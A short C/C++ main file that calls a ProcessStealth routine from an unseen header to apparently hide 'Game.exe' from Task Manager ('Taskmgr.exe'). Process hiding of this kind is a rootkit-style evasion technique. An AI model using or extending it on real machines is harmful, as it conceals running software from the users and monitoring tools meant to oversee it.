#include "ProcessStealth.h"

int main(int argc, char *argv[])
{
    wchar_t Target[] = L"Taskmgr.exe";
    wchar_t Hide[] = L"Game.exe";
    ProcessStealth(Target, Hide);
    system("pause");
}
